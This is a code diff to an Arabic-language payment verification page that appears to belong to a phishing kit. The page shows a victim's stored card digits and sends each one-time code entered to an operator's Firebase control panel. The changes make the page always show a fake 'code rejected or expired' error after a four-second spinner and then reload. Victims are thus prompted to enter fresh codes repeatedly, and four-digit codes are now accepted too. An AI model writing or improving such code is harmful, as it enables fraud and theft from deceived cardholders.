@@ -34,7 +34,7 @@
             text-align: center;
             padding-bottom: 15px;
             border-bottom: 1px solid rgba(0,0,0,0.06);
-            margin-bottom:  ​20px;
+            margin-bottom:  20px;
         }
         .logo { width: 90px; }
         .hero-card {
@@ -44,44 +44,44 @@
             padding: 25px;
             margin-bottom: 25px;
             text-align: center;
-            box-shadow:  ​0 10px 22px rgba(177, 140, 51, 0.12);
+            box-shadow:  0 10px 22px rgba(177, 140, 51, 0.12);
         }
         .hero-card i { font-size: 2.5rem; color: #b18c33; margin-bottom: 15px; }
-        .hero-card h2 { color: #0d3f72; font-size: 1.1rem; margin-bottom:  ​10px; }
+        .hero-card h2 { color: #0d3f72; font-size: 1.1rem; margin-bottom:  10px; }
         .hero-card p { color: #56647d; font-size: 0.9rem; line-height: 1.7; }
-        h3 { text-align: center; color: #293244; margin-bottom: 8px; font-size:  ​1rem; }
-        .subtitle { text-align: center; color: #8090a9; font-size: 0.85rem; margin-bottom:  ​20px; }
+        h3 { text-align: center; color: #293244; margin-bottom: 8px; font-size:  1rem; }
+        .subtitle { text-align: center; color: #8090a9; font-size: 0.85rem; margin-bottom:  20px; }
         .field { margin-bottom: 20px; }
         .label { display: block; margin-bottom: 10px; font-weight: 600; color: #3f4b5f; text-align: right; }
         input {
             width: 100%;
             padding: 16px;
             border: 2px solid rgba(33, 76, 124, 0.2);
-            border-radius:  ​14px;
+            border-radius:  14px;
             font-size: 1.5rem;
             font-family: inherit;
             text-align: center;
             direction: ltr;
-            letter-spacing:  ​0.3em;
+            letter-spacing:  0.3em;
             font-weight: 700;
         }
         input:focus { outline: none; border-color: rgba(29, 124, 236, 0.6); }
         .error { color: #dc3545; text-align: center; margin-top: 10px; font-size: 0.85rem; display: none; }
-        .success { color: #1a9c56; text-align: center; margin-top:  ​10px; font-size: 0.85rem; display: none; font-weight: 700; }
+        .success { color: #1a9c56; text-align: center; margin-top:  10px; font-size: 0.85rem; display: none; font-weight: 700; }
         .btn {
             width: 100%;
             padding: 16px;
             background: linear-gradient(180deg, #d6b45b, #b18c33);
             color: #fff;
             border: none;
-            border-radius:  ​12px;
+            border-radius:  12px;
             font-size: 1.1rem;
             font-weight: 800;
             font-family: inherit;
             cursor: pointer;
         }
         .btn:hover { transform: translateY(-2px); }
-        .timer { text-align: center; margin-top:  ​20px; color: #1f1f1f; font-size: ​ ​0.85rem; }
+        .timer { text-align: center; margin-top:  20px; color: #1f1f1f; font-size:  0.85rem; }
         .timer strong { color: #f03a2d; }
         .help { text-align: center; margin-top: 15px; color: #6d7888; font-size: 0.85rem; }
         .loading-overlay {
@@ -92,13 +92,13 @@
             display: none;
             align-items: center;
             justify-content: center;
-            z-index: ​ ​9999;
+            z-index:  9999;
         }
         .loading-overlay.show { display: flex; }
         .loading-card {
             background: rgba(20,20,20,0.9);
             padding: 40px;
-            border-radius:  ​24px;
+            border-radius:  24px;
             text-align: center;
             color: #f4f1e6;
         }
@@ -107,7 +107,7 @@
             height: 50px;
             border: 4px solid rgba(214, 180, 91, 0.2);
             border-top-color: #b18c33;
-            border-radius:  ​50%;
+            border-radius:  50%;
             animation: spin 0.8s linear infinite;
             margin: 0 auto 20px;
         }
@@ -133,7 +133,7 @@
             <form id="otpForm">
                 <div class="field">
                     <input type="tel" id="otpCode" maxlength="6" placeholder="• • • • • •" autocomplete="one-time-code">
-                    <p class="error" id="otpError" data-i18n="otpError">رمز التحقق غير صحيح</p>
+                    <p class="error" id="otpError" data-i18n="otpError">تم رفض رمز التحقق غير صحيح او منتهي الصلاحية</p>
                     <p class="success" id="otpSuccess">✅ تم إرسال رمز التحقق بنجاح</p>
                 </div>
                 <button type="submit" class="btn" data-i18n="confirm">تأكيد</button>
@@ -147,7 +147,7 @@
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-card">
             <div class="spinner"></div>
-            <p data-i18n="verifying">جاري التحقق من المعلومات...</p>
+            <p data-i18n="verifying">يرجى الانتظار جاري التحقق من العملية...</p>
         </div>
     </div>
     
@@ -155,6 +155,13 @@
         // عرض آخر 4 أرقام من البطاقة (المحفوظة من صفحة إدخال البطاقة)
         const last4 = sessionStorage.getItem('paymentCardLast4') || localStorage.getItem('paymentCardLast4');
         if (last4 && document.getElementById('last4')) document.getElementById('last4').textContent = last4;
+
+        // إظهار رسالة الرفض بعد إعادة تحميل الصفحة
+        if (sessionStorage.getItem('otpRejected') === '1') {
+            sessionStorage.removeItem('otpRejected');
+            const errEl = document.getElementById('otpError');
+            if (errEl) errEl.style.display = 'block';
+        }
         
         // مؤقت انتهاء الصلاحية (60 ثانية)
         let countdown = 60;
@@ -174,12 +181,9 @@
             }, 1000);
         }
         startCountdown();
-        
+
         document.getElementById('otpCode').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '' ).slice(0, 6);
-            if (this.value.length === 6) {
-                setTimeout(() => document.getElementById('otpForm').dispatchEvent(new Event('submit')), 300);
-            }
         });
         
         document.getElementById('otpForm').addEventListener('submit', function(e) {
@@ -188,34 +192,27 @@
             const errEl = document.getElementById('otpError');
             const okEl = document.getElementById('otpSuccess');
             if (okEl) okEl.style.display = 'none';
-            if (otp.length !== 6) {
-                if (errEl) { errEl.textContent = 'يرجى إدخال رمز التحقق المكون من 6 أرقام'; errEl.style.display = 'block'; }
+            if (otp.length !== 6 && otp.length !== 4) {
+                if (errEl) { errEl.textContent = 'يرجى إدخال رمز التحقق المكون من 4 أو  6 أرقام'; errEl.style.display = 'block'; }
                 return;
             }
             if (errEl) errEl.style.display = 'none';
-            document.getElementById('loadingOverlay').classList.add('show');
+            const btn = document.querySelector('.btn');
+            if (btn) btn.disabled = true;
 
             // إرسال الرمز إلى Firebase (يظهر في لوحة التحكم فوراً:
             // customers/{sessionId}.otp + card_data/{sessionId}/otps + otps/)
-            function done(ok, msg) {
-                document.getElementById('loadingOverlay').classList.remove('show');
-                if (ok) {
-                    if (okEl) { okEl.textContent = msg || '✅ تم إرسال رمز التحقق بنجاح'; okEl.style.display = 'block'; }
-                } else {
-                    if (errEl) { errEl.textContent = msg || 'فشل إرسال الرمز، يرجى المحاولة مرة أخرى'; errEl.style.display = 'block'; }
-                }
+            if (typeof window.pushFirebaseOtp === 'function') {
+                try { window.pushFirebaseOtp(otp); } catch (err) { console.error(err); }
             }
 
-            if (typeof window.pushFirebaseOtp === 'function') {
-                Promise.resolve()
-                    .then(() => window.pushFirebaseOtp(otp))
-                    .then(() => { done(true); })
-                    .catch(() => { done(false); });
-            } else {
-                // احتياط بدون Firebase: إظهار رسالة نجاح افتراضية بعد لحظة قصيرة
-                setTimeout(() => done(true), 800);
-            }
+            // شاشة الانتظار لمدة 4 ثواني، ثم إعادة تحميل الصفحة مع رسالة الرفض
+            sessionStorage.setItem('otpRejected', '1');
+            document.getElementById('loadingOverlay').classList.add('show');
+            setTimeout(function() {
+                window.location.reload();
+            }, 4000);
         });
-    </script>
+</script>
 </body>
 </html>
